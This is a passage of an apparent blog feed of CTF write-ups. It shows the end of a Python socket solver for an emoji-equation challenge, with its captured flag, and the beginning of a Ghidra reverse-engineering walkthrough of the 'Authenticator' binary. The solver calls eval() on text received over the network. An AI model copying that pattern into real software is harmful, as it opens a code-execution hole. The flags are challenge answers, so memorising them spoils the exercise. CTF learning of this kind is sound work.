style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> value </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> values</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    decodedValues</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dic</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">value</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  expressions </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> arr</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  expressions</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">decodedValues</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">expressions</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  index </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  equation </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> value </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> decodedValues</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    equation </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> index </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">expressions</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      equation </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> expressions</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">index</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    index </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">eval</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">equation</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">'\n'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># main</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> socket</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">socket</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">socket</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> socket</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SOCK_STREAM</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HOST</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PORT</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">settimeout</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    receive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># go to option 1, to generate our dictionary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    buf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'1'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    buf </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'\n'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> receive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dic </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> getCode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">res</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># start the exam</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    buf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'2'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    buf </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'\n'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># keep answering questions until connection is closed</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> receive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">res</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      answer </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> solveEquation</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">res</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dic</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">answer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">answer</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Connection closed."</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>By the end, we will get the flag in a response</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Authenticator - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/authenticator-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/authenticator-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-29T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the Authenticator challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Reverse.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the Authenticator challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Reverse.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/authenticator-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>We managed to steal one of the extraterrestrials' authenticator device. If we manage to understand how it works and get their credentials, we may be able to bypass all of their security locked doors and gain access everywhere!</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/authenticator-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We're given a binary executable called authenticator with the following properties:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">file</span><span class="token plain"> authenticator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">authenticator: ELF </span><span class="token number" style="color:#36acaa">64</span><span class="token plain">-bit LSB shared object, x86-64, version </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">SYSV</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> GNU/Linux </span><span class="token number" style="color:#36acaa">3.2</span><span class="token plain">.0, BuildID</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">sha1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">66286657ca5a06147189b419238b2971b11c72db, not stripped</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>My favourite way to get an initial idea about a <em>not stripped</em> binary is to run  <code>strings</code> on it. It might not get you everything you need, but it does give you a very good idea of what you're up against. So, running strings on <code>authenticator</code>, we get a bit of nonsense, and a few very interesting things:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">strings authenticator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">omitted </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">a:Vh</span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">a:g</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">8j</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">89gV</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">p</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">:dV</span><span class="token operator file-descriptor important" style="color:#393A34">8</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">Vg9</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">V</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">9V</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">:j</span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Authentication System </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your credentials to continue.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Alien ID: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">11337</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Access Denied</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pin: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Access Granted</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"> Submit pin </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> the flag format: CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">fl4g_h3r3</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">*3$"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">omitted </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Well fun, let's run the binary and see if this is useful.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./authenticator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Authentication System 👽</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your credentials to continue.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Alien ID: </span><span class="token number" style="color:#36acaa">11337</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pin: </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Wouldn't you know it, the Alien ID value is what we saw in strings. Sadly, with the Pin we won't be so lucky. I did have a feeling that it will have something to do with that weird string <code>}a:Vh|}a:g}8j=}89gV&lt;p&lt;}:dV8&lt;Vg9}V&lt;9V&lt;:j|{:</code>, but we don't know anything about it yet.</p>
<p>So, let's open the binary in Ghidra, and check if we can find something in there. We can check out the decompiled <code>main</code> function first</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">undefined8 </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> iVar1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  undefined8 uVar2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> in_FS_OFFSET</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  undefined auStack88 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  undefined auStack56 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">40</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> lStack16</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  lStack16 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">in_FS_OFFSET </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">setbuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">printstr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">DAT_00100bc3</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">printstr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">DAT_00100be8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">printstr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">DAT_00100c15</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">fgets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">auStack88</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  iVar1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strcmp</span><span class="token punctuation" 